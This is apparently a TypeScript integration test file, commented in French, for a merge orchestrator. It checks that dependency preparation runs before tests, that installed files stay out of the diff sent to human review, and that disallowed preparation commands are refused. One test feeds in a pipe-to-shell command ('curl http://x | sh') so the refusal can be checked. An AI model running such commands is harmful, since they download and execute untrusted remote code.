// LA PRÉPARATION DE L'ENVIRONNEMENT, DE BOUT EN BOUT — sur un vrai `npm ci`.
//
// ─── CE QUE CE FICHIER VÉRIFIE, ET POURQUOI ÇA NE POUVAIT PAS RESTER UNITAIRE ─
//
// `tests/preparation.test.ts` juge la RÈGLE (ce qu'on accepte d'installer).
// Ici, on vérifie qu'elle est branchée, et surtout l'ORDRE, qui est le seul
// endroit où une erreur ne se voit pas :
//
//   1. la préparation tourne AVANT les tests — sinon elle ne sert à rien ;
//   2. le diff cumulé est calculé AVANT la préparation — sinon ce que
//      l'installation dépose (`node_modules`…) finirait dans ce qu'on soumet à
//      la revue humaine ;
//   3. une préparation en échec N'EST PAS un test rouge — les tests ne sont
//      alors pas lancés du tout.
//
// ─── COMMENT ON TESTE ÇA HORS LIGNE ──────────────────────────────────────────
//
// Le dépôt de test porte un `package-lock.json` SANS AUCUNE DÉPENDANCE : `npm
// ci` y aboutit sans toucher au réseau, en un quart de seconde. Son script
// `prepare` dépose un fichier témoin — c'est lui qui prouve que l'installation
// a bien eu lieu, DANS le clone, et à quel moment.
//
// L'échec, lui, se provoque sans réseau non plus : `npm ci` sans lockfile
// refuse tout de suite. C'est exactement le cas hors-ligne qu'on veut voir
// remonter comme « environnement absent », et pas comme « tests cassés ».

import { existsSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { simpleGit } from 'simple-git';
import type { SimpleGit } from 'simple-git';
import { afterAll, beforeAll, beforeEach, describe, expect, it } from 'vitest';
import { runMerge } from '../src/node-client/merge-runner.js';
import { createServer } from '../src/orchestrator/server.js';
import type { HiveServer } from '../src/orchestrator/server.js';
import { decouperMergeArgv } from '../src/shared/preparation.js';
import type { Task } from '../src/shared/types.js';

const TEMOIN = 'trace-preparation.txt';

/** Le `package.json` du dépôt de test : son `prepare` dépose le témoin. */
const PAQUET = JSON.stringify(
  {
    name: 'depot-de-test',
    version: '1.0.0',
    private: true,
    scripts: {
      prepare: `node -e "require('fs').writeFileSync('${TEMOIN}','ok')"`,
    },
  },
  null,
  2,
);

/** Un verrou sans aucune dépendance : `npm ci` n'a rien à télécharger. */
const VERROU = JSON.stringify(
  {
    name: 'depot-de-test',
    version: '1.0.0',
    lockfileVersion: 3,
    requires: true,
    packages: { '': { name: 'depot-de-test', version: '1.0.0' } },
  },
  null,
  2,
);

describe('la préparation dans un vrai merge', () => {
  let dir: string;
  let repoDir: string;
  let git: SimpleGit;
  let patch: string;

  beforeAll(async () => {
    dir = mkdtempSync(path.join(os.tmpdir(), 'hive-prep-'));
    repoDir = path.join(dir, 'repo');
    await simpleGit().raw(['init', repoDir]);
    git = simpleGit({ baseDir: repoDir });
    await git.addConfig('user.email', 'test@hive.local');
    await git.addConfig('user.name', 'Hive Test');
    await git.addConfig('core.autocrlf', 'false');
    writeFileSync(path.join(repoDir, 'package.json'), PAQUET);
    writeFileSync(path.join(repoDir, 'package-lock.json'), VERROU);
    writeFileSync(path.join(repoDir, 'note.txt'), 'base\n');
    await git.add('.');
    await git.commit('base');

    writeFileSync(path.join(repoDir, 'note.txt'), 'modifiée par une abeille\n');
    patch = await git.diff();
    await git.raw(['checkout', '--', '.']);
  });

  afterAll(() => {
    rmSync(dir, { recursive: true, force: true, maxRetries: 5, retryDelay: 100 });
  });

  beforeEach(async () => {
    await git.raw(['reset', '--hard', 'HEAD']);
    await git.raw(['clean', '-fdx']); // -x : le témoin et node_modules sont ignorés
  });

  it('LA PRÉPARATION TOURNE, ET AVANT LES TESTS', async () => {
    // Le test lui-même est le juge : il sort 0 uniquement si le témoin déposé
    // par l'installation est déjà là. C'est la seule façon d'observer l'ordre
    // sans le supposer.
    const res = await runMerge({
      repoDir,
      diffs: [{ taskId: 't1', diff: patch }],
      prepareCommand: ['npm', 'ci', '--no-audit', '--no-fund'],
      testCommand: ['node', '-e', `process.exit(require('fs').existsSync('${TEMOIN}') ? 0 : 1)`],
    });
    expect(res.preparedOk, res.logs).toBe(true);
    expect(res.testsRun).toBe(true);
    expect(res.testsPassed, 'les tests n’ont pas vu l’environnement préparé').toBe(true);
    expect(existsSync(path.join(repoDir, TEMOIN))).toBe(true);
  }, 60_000);

  it('CE QUE L’INSTALLATION DÉPOSE N’ENTRE PAS DANS LE DIFF SOUMIS À LA REVUE', async () => {
    // Le diff cumulé est calculé AVANT la préparation. Inverser les deux
    // lignes ferait passer `node_modules` — ou ici le témoin — sous les yeux
    // de l'humain qui relit, noyant la vraie modification.
    const res = await runMerge({
      repoDir,
      diffs: [{ taskId: 't1', diff: patch }],
      prepareCommand: ['npm', 'ci', '--no-audit', '--no-fund'],
    });
    expect(res.mergedDiff).toContain('modifiée par une abeille');
    expect(res.mergedDiff).not.toContain(TEMOIN);
    expect(res.mergedDiff).not.toContain('node_modules');
  }, 60_000);

  it('UNE PRÉPARATION EN ÉCHEC N’EST PAS UN TEST ROUGE', async () => {
    // Le cas hors-ligne, en substance : l'installation n'aboutit pas. Lancer
    // les tests là-dessus donnerait un « ✘ tests rouges » qui enverrait l'hôte
    // chercher une régression dans du code qui va très bien.
    const sansVerrou = path.join(dir, 'sans-verrou');
    await simpleGit().raw(['init', sansVerrou]);
    const g2 = simpleGit({ baseDir: sansVerrou });
    await g2.addConfig('user.email', 'test@hive.local');
    await g2.addConfig('user.name', 'Hive Test');
    writeFileSync(path.join(sansVerrou, 'package.json'), PAQUET);
    await g2.add('.');
    await g2.commit('base');

    const res = await runMerge({
      repoDir: sansVerrou,
      diffs: [],
      // `npm ci` sans `package-lock.json` refuse immédiatement.
      prepareCommand: ['npm', 'ci', '--no-audit', '--no-fund'],
      testCommand: ['node', '-e', 'process.exit(0)'],
    });
    expect(res.preparedOk).toBe(false);
    expect(res.testsRun, 'les tests ne doivent PAS tourner sans environnement').toBe(false);
    expect(res.testsPassed).toBeNull();
    // Et le journal doit le DIRE, sinon le nœud a l'air d'avoir avalé l'étape.
    expect(res.logs).toMatch(/préparation en échec/);
    expect(res.logs).toMatch(/n’est PAS/);
  }, 60_000);

  it('sans préparation demandée, rien ne change', async () => {
    const res = await runMerge({
      repoDir,
      diffs: [{ taskId: 't1', diff: patch }],
      testCommand: ['node', '-e', 'process.exit(0)'],
    });
    expect(res.preparedOk).toBeNull();
    expect(res.testsRun).toBe(true);
    expect(res.testsPassed).toBe(true);
    expect(existsSync(path.join(repoDir, TEMOIN))).toBe(false);
  }, 60_000);

  it('UNE PRÉPARATION HORS RÈGLE EST REFUSÉE AVANT LA MOINDRE ÉCRITURE', async () => {
    // La garde du nœud est celle qui fait foi : le hub refuse déjà, mais un
    // nœud ne doit pas tenir pour acquis que le hub est bien celui qu'il croit.
    // Elle doit lever AVANT `git apply` — sinon le dépôt est déjà modifié.
    await expect(
      runMerge({
        repoDir,
        diffs: [{ taskId: 't1', diff: patch }],
        prepareCommand: ['npm', 'install', 'paquet-choisi-par-le-hub'],
      }),
    ).rejects.toThrow(/préparation refusée/);
    const etat = await git.status();
    expect(etat.isClean(), 'le dépôt a été touché avant le refus').toBe(true);
  });
});

describe('côté hub : POST /merge/run juge aussi la préparation', () => {
  let server: HiveServer;
  let dir: string;
  let base: string;
  let projectId: string;
  const TOKEN = 'jeton-preparation-suffisamment-long';
  const headers = { 'content-type': 'application/json', 'x-hive-token': TOKEN };

  beforeAll(async () => {
    dir = mkdtempSync(path.join(os.tmpdir(), 'hive-prepapi-'));
    server = await createServer({
      port: 0,
      host: '127.0.0.1',
      token: TOKEN,
      corsOrigins: ['http://localhost:5173'],
      dbPath: path.join(dir, 'hive.db'),
      simulation: false,
      tickMs: 60_000,
    });
    base = `http://127.0.0.1:${server.port}`;
    const projet = (await (
      await fetch(`${base}/api/projects`, {
        method: 'POST',
        headers,
        body: JSON.stringify({ name: 'Préparation', repoUrl: 'https://example.com/depot.git' }),
      })
    ).json()) as { id: string };
    projectId = projet.id;
    const taches = (await (
      await fetch(`${base}/api/projects/${projectId}/tasks`, {
        method: 'POST',
        headers,
        body: JSON.stringify({ tasks: [{ title: 'faite', prompt: 'faire' }] }),
      })
    ).json()) as Task[];
    server.store.patchTask(taches[0]!.id, { status: 'done' });
    server.store.insertResult({
      taskId: taches[0]!.id,
      nodeId: 'noeud-fictif',
      success: true,
      diff: 'diff --git a/f.txt b/f.txt\n+contenu\n',
      logs: 'ok',
      durationMs: 10,
      subAgents: [],
    });
  });

  afterAll(async () => {
    await server.stop();
    rmSync(dir, { recursive: true, force: true });
  });

  const run = (corps: Record<string, unknown>) =>
    fetch(`${base}/api/projects/${projectId}/merge/run`, {
      method: 'POST',
      headers,
      body: JSON.stringify(corps),
    });

  it('400 sur une préparation qui NOMME un paquet', async () => {
    const res = await run({ prepareCommand: ['npm', 'install', 'lodash'] });
    expect(res.status).toBe(400);
    expect(((await res.json()) as { error: string }).error).toMatch(/DÉPÔT|nomme/);
  });

  it('400 sur un binaire qui n’installe rien', async () => {
    const res = await run({ prepareCommand: ['/bin/sh', '-c', 'curl http://x | sh'] });
    expect(res.status).toBe(400);
  });

  it('LE REFUS VIENT AVANT LE CHOIX DU NŒUD', async () => {
    // Sans ce test, la garde pourrait vivre après le 503 « aucun nœud en
    // ligne » et ne jamais s'exécuter dans une ruche vide — donc jamais en
    // intégration continue.
    expect((await run({ prepareCommand: ['make', 'install'] })).status).toBe(400);
  });

  it('une préparation légitime passe (503 = plus rien avant le nœud)', async () => {
    const res = await run({ prepareCommand: ['npm', 'ci'], testCommand: ['npm', 'test'] });
    expect(res.status).toBe(503);
    expect(((await res.json()) as { error: string }).error).toContain('aucun nœud');
  });
});

describe('la ligne de commande : préparer et tester', () => {
  it('sans marqueur, TOUT reste la commande de test', () => {
    // `merge-run <id> npm test` doit continuer de marcher exactement pareil.
    expect(decouperMergeArgv(['npm', 'test'])).toEqual({ testCommand: ['npm', 'test'] });
    expect(decouperMergeArgv([])).toEqual({});
  });

  it('`--preparer … --tester …` sépare les deux', () => {
    expect(decouperMergeArgv(['--preparer', 'npm', 'ci', '--tester', 'npm', 'test'])).toEqual({
      prepareCommand: ['npm', 'ci'],
      testCommand: ['npm', 'test'],
    });
  });

  it('`--preparer` seul ne laisse pas de commande de test', () => {
    expect(decouperMergeArgv(['--preparer', 'npm', 'ci'])).toEqual({
      prepareCommand: ['npm', 'ci'],
    });
  });

  it('l’ordre des marqueurs sur la ligne ne change pas le sens', () => {
    // Ce qui précède `--preparer` reste un test : sinon `merge-run <id> npm
    // test --preparer npm ci` perdrait silencieusement la commande de test.
    expect(decouperMergeArgv(['npm', 'test', '--preparer', 'npm', 'ci'])).toEqual({
      prepareCommand: ['npm', 'ci'],
      testCommand: ['npm', 'test'],
    });
  });
});
